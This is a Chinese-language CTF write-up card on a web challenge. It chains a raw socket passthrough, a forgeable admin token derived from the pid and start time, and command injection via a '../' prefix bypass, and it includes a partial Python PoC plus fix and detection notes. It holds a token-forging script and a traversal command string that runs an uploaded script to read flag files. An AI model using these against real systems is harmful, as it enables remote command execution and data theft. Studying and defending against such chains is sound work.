---
id: ctf-web-raw-socket-admin-token-ncm-command-injection
title: AI 引擎 raw 协议透传 + 弱派生 admin token + NCM Type=5 命令注入（validate_hook 前缀 ../ 绕过）
type: scenario
domain: ctf
path: ctf/web
technique: raw-socket-admin-token-ncm-command-injection
tags:
- ctf
- web
- ai-security
- raw-protocol
- token-forgery
- command-injection
- path-traversal
- ncm
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V123
  verified_at: '2026-11-06T04:27:25+08:00'
  notes: 已对照原文与4张图核对：/api/raw Base64 透传与 5+len 长度协议、/api/status pid/uptime、calc_admin_key SBOX 派生、CMD_ADMIN 0xFF sub_cmd=1/2、NCM Type=5 system、validate_hook 前缀+元字符过滤与 ../ 绕过、上传 cmd.sh/evil.ncm 及 /api/download 取 flag 均与原文一致。修正卡片把 verify_admin_token 首参误写为 pid 的问题：首参是请求 timestamp，60 秒窗口为 abs(now-timestamp)<=60，g_pwn 才由 pid/start_time 派生；另补全 cmd.sh 实际读取的多个 flag 路径。原文未给组件版本，未设置 versions；frontmatter 无 sources/source_url。未验证点：本库未复跑该题 EXP。
url: /docs/ctf/web/ctf-web-raw-socket-admin-token-ncm-command-injection/
draft: false
kb_aliases:
- neural
- NeuralChat
- /api/raw 透传
- verify_admin_token
- g_pwn 派生
- NCM Type=5
- validate_hook 前缀绕过
- load_ncml_model
---

## 一句话结论

Flask 前端 `/api/raw` 把 Base64 二进制原样转发给 Unix socket 的 C 引擎；`/api/status` 泄露 pid/uptime，`verify_admin_token` 用 `SHA256(timestamp, sub_cmd, payload, g_pwn)` 且 60 秒窗口，`g_pwn` 由 pid/start_time 经自定义 SBOX 哈希派生；爆破 start_time ±10 伪造 admin token，触发 `handle_admin` sub_cmd=2 重载恶意 `.ncm`；`load_ncml_model` 的 Type=5 块把命令拷到全局 `p_command` 并 `system()`，`validate_hook` 只要求 `/opt/neuralchat/plugins/` 前缀且过滤 shell 元字符，但允许 `../`，用 `/opt/neuralchat/plugins/../../../bin/sh <script>` 执行上传脚本。

## 原理

- **raw 协议透传**：`app.py` 的 `/api/raw` 把用户提供的 Base64 解码后直接 `send_to_engine`；协议为 `struct.pack('<I', 5+len(payload)) + bytes([command]) + payload`，没有命令白名单/长度/来源校验。
- **弱 admin token**：`verify_admin_token(timestamp, sub_cmd, payload, n4, token)` 先检查 `abs(now - timestamp) <= 60`，再 `SHA256(timestamp(4) + sub_cmd(1) + payload + g_pwn(16))` 与客户端 token 比较。`g_pwn` 由 `pid` 与 `start_time` 经 `73244475*pid ^ 295559667*start_time`、移位异或、AES SBOX 查表、`0x9e3779b9*(i+1)` 混合派生。
- **时间/pid 可观测**：`/api/status` 返回 `pid` 与 `uptime`；HTTP `Date` 头给出服务器当前时间；`start_time = server_time - uptime`，本地时钟/代理误差用 ±10 秒爆破即可命中。
- **admin 命令**：`handle_admin` 处理 `CMD_ADMIN (0xFF)`，`sub_cmd=1` 可用于测试 token，`sub_cmd=2` 重新加载指定模型文件。
- **NCM 命令注入**：`load_ncml_model` 解析 `.ncm` 文件，遇到 `Type=5` 块时把数据拷贝到全局 `p_command`，经 `validate_hook` 后执行 `system(&p_command)`。
- **validate_hook 绕过**：函数要求命令以 `/opt/neuralchat/plugins/` 开头，并过滤 `;|&\`$><(){}[]!#~\n`，但没有规范化路径；用 `/opt/neuralchat/plugins/../../../bin/sh <上传脚本>` 既满足前缀，又通过 `../` 跳到 `/bin/sh`。
- **文件上传**：`/api/knowledge/upload` 允许上传任意文件；先上传 `cmd.sh`（内容为读取 `/home/ctf/flag`、`/home/ctf/flag.txt`、`/flag`、`/opt/neuralchat/flag.txt` 并写入 `/opt/neuralchat/downloads/pwned.txt`），再上传 `evil.ncm`，最后用 `/api/download?file=pwned.txt` 取结果。

## 触发条件

- Web 前端存在 raw 二进制透传接口，且后端 C 引擎的符号未剥离/可逆向。
- admin token 的 `g_pwn` 只依赖可观测的 pid/服务启动时间且无服务端密钥，时间窗口可爆破。
- NCM/模型解析器支持命令块并直接 `system()`；校验只做前缀/字符黑名单，未做路径规范化。
- 有任意文件上传与下载接口。

## 利用步骤

1. `GET /api/status` 取 `pid`、`uptime`；从 HTTP `Date` 头取服务器时间，推算 `start_time = server_time - uptime`。
2. 对 `start_time ± 10` 逐个计算 `g_pwn`，构造 `SHA256(pack('<I', now) + sub_cmd + payload + g_pwn)`，发 `CMD_ADMIN sub_cmd=1` 测试；响应以 `\x00` 开头即命中。
3. 上传 `cmd.sh`（读 flag 到 downloads），记下返回路径。
4. 构造 `evil.ncm`：`NCML` + 头字段 + `Type=5` 块，命令为 `/opt/neuralchat/plugins/../../../bin/sh <cmd.sh路径>`。
5. 上传 `evil.ncm`，用命中 token 发 `CMD_ADMIN sub_cmd=2`，payload 为 ncm 路径，触发重载与 `system()`。
6. 等待执行后 `GET /api/download?file=pwned.txt` 读取 flag。

## PoC

```python
import requests, struct, hashlib, time
from email.utils import parsedate_to_datetime

URL = "http://target:5000"
SBOX = [...]  # 256 字节 AES SBOX

def calc_admin_key(pid, start_time):
    M = 0xFFFFFFFF
    v = (((73244475 * pid) & M) ^ ((295559667 * start_time) & M)) & M
    out = bytearray(16)
    for i in range(16):
        t = ((v << 13) & M) ^ v
        t = ((t >> 7) ^ t) & M
        t = ((t << 17) & M) ^ t
        out[i] = SBOX[t & 0xFF]
        v = (((0x9e3779b9 * (i + 1)) & M) + t) & M
    return bytes(out)

def send_admin(sub, payload, g_pwn, now):
    body = struct.pack('<I', now) + bytes([sub]) + payload
    token = hashlib.sha256(body + g_pwn).digest()
    raw = bytes([0xFF]) + struct.pack('<I', now) + bytes([sub]) + token + payload
    r = requests.post(f"{URL}/api/raw", json={"data": __import__("base64").b64encode(raw).decode()})
    return r.json()

# status/Date -> start_time; brute ±10; upload cmd.sh/evil.ncm; sub_cmd=2 重载
```

## 变体与关联

- **token 变体**：HMAC-SHA256 带服务端密钥则不可伪造；若密钥硬编码/可从二进制提取，仍可离线复现；时间窗口更大时爆破更容易。
- **协议变体**：长度前缀可能是大端/变长；命令码可能多字节；payload 可能压缩/加密。
- **NCM 变体**：Type 编号/块结构不同；命令可能拼接参数；校验可能用 `realpath`/白名单目录（可尝试 symlink/`..`/编码绕过）。
- **关联卡片**：[[ctf-web-admin-self-register-trace-id-pickle-log-leak]]（弱身份/日志链）、[[web-generic-auth-hpp-duplicate-param-auth-data-mismatch]]（协议解析差异）、[[binary-pwn-heap-abs-intmin-length-bypass-bss-fake-chunk-tcache-got]]（同篇 pwn 题，已单独成卡）。
- **边界**：若 raw 接口有命令白名单、token 使用高熵服务端密钥、NCM 校验做 `realpath` 前缀检查，本链不成立。

## 检测与防御

- **CTF/验证**：先确认 `/api/status` 的 pid/uptime 与 Date 头可用于推算 start_time，再确认 sub_cmd=1 测试 token 成功，最后确认 NCM 重载触发脚本。
- **修复**：raw 接口做命令白名单与长度/来源校验；admin token 用 HMAC + 高熵服务端密钥，不要由 pid/时间派生；NCM 解析器对命令做 `realpath` 规范化并限制在插件目录；禁止 `..`/符号链接；引擎以低权限运行，上传目录不可执行。
- **检测信号**：`/api/raw` 收到 `0xFF` 命令；短时间内大量 token 尝试（±10 时间窗口）；上传 `.ncm`/`.sh` 文件；`system` 调用参数含 `../`。
